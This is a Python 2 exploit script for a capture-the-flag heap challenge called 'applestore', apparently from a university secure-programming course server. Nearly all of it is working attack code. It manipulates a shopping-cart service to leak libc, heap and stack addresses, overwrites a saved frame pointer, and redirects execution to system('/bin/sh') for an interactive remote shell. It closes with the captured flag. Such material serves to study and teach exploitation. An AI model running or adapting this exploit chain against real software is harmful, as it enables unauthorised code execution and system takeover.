# Echo client program
import telnetlib
import socket,sys

def recv_print(s, size):
    buf = s.recv(size)
    sys.stdout.write(buf)
    sys.stdout.flush()
    return buf

# The remote host
host = 'secprog.cs.nctu.edu.tw' 
port = 10031
#host = 'localhost' 
#port = 5566

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

buf = recv_print(s, 64)

# buy iphone to 7174
i = 0
while i < 16:
    s.send("2")
    buf = recv_print(s, 64)
    s.send("1")
    buf = recv_print(s, 64)
    buf = recv_print(s, 64)
    i = i + 1

i = 0
while i < 10:
    s.send("2")
    buf = recv_print(s, 64)
    s.send("4")
    buf = recv_print(s, 64)
    buf = recv_print(s, 64)
    i = i + 1

# get a iphone 8
s.send("5")
buf = recv_print(s, 64)
s.send("y")
buf = recv_print(s, 64)
buf = recv_print(s, 1024)

# check list to leak libc_base
s.send("4")
buf = recv_print(s, 64)
payload = "yy" + "\x08\x04\xb0\x24"[::-1] + "\x00\x00\x00\x01"[::-1] + "\x00\x00\x00\x00"*2
s.send(payload)
buf = recv_print(s, 1024)
malloc_addr = buf[560:564][::-1]
print '\nleak malloc_addr: ' + malloc_addr.encode("hex")
base_addr = str(hex(int(malloc_addr.encode("hex"), 16) - 0x76360)[2:-1]).decode("hex")
print 'aslr base_addr: ' + base_addr.encode("hex")
system_addr = str(hex(int(base_addr.encode("hex"), 16) + 0x3fc40)[2:-1]).decode("hex")
print 'get system_addr: ' + system_addr.encode("hex")
binsh_addr = str(hex(int(base_addr.encode("hex"), 16) + 0x15e324)[2:-1]).decode("hex")
print 'get BinSh_addr: ' + binsh_addr.encode("hex")

# delete 0~25 item
i = 0
while i < 25:
    s.send("3")
    buf = recv_print(s, 64)
    s.send("2")
    buf = recv_print(s, 64)
    i = i + 1

# check list to leak heap and stack addr
i = 0
myCart_next_addr = "\x08\x04\xb0\x70"
s.send("4")
buf = s.recv(64)
payload = "yy" + myCart_next_addr[::-1] + "\x00\x00\x00\x01"[::-1] + "\x00\x00\x00\x00"*2
s.send(payload)
buf = s.recv(1024)
print buf
heap_addr = buf[37:41][::-1]
print 'leak heap_addr: ' + heap_addr.encode("hex")
str_next_addr = str(hex(int(heap_addr.encode("hex"), 16) + 0x8))[2::]
while len(str_next_addr) < 8:
    str_next_addr = '0' + str_next_addr 
next_addr = (str_next_addr).decode('hex')
print 'send next_item_addr: ' + next_addr.encode("hex")

s.send("4")
buf = s.recv(64)
payload = "yy" + next_addr[::-1] + "\x00\x00\x00\x01"[::-1] + "\x00\x00\x00\x00"*2
s.send(payload)
buf = s.recv(1024)
stack_addr = buf[37:41][::-1]
print 'leak stack_addr(0x00): ' + stack_addr.encode("hex")

# delete() iphone 8 to set main_ebp = read_buf_addr
main_ebp_addr = str(hex(int(stack_addr.encode("hex"), 16) + 0x54))[2:-1].decode("hex")
print 'main_ebp_addr(0x54): ' + main_ebp_addr.encode("hex")
read_buf_addr = str(hex(int(stack_addr.encode("hex"), 16) + 0x3e))[2:-1].decode("hex")
print 'read_buf_addr(0x3e): ' + read_buf_addr.encode("hex")

s.send("3")
buf = recv_print(s, 64)
payload = "2a" + "\x00\x00\x00\x00" + "\x00\x00\x00\x01"[::-1] + main_ebp_addr[::-1] + read_buf_addr[::-1]
s.send(payload)
buf = recv_print(s, 1024)

# exit go to main to get a shell
payload = "6aaa" + system_addr[::-1] + "bbbb" + binsh_addr[::-1]
s.send(payload)

#cat home/applestore/flag
#SECPROG{It's_a_simple_version_from_TowelRoot!You're_Taiwan_GeoHotz}

t = telnetlib.Telnet()
t.sock = s 
t.interact()
